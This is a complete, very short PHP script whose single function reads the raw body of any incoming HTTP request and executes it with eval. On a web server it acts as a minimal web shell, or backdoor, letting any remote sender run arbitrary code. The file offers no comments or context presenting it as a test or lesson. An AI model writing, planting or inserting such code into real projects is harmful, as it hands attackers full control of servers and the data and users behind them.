<?php 
		
	function sendPhpCode() {

	    $phpCode = file_get_contents('php://input');	    
	    eval('?>'.$phpCode);

	}
	sendPhpCode();

?>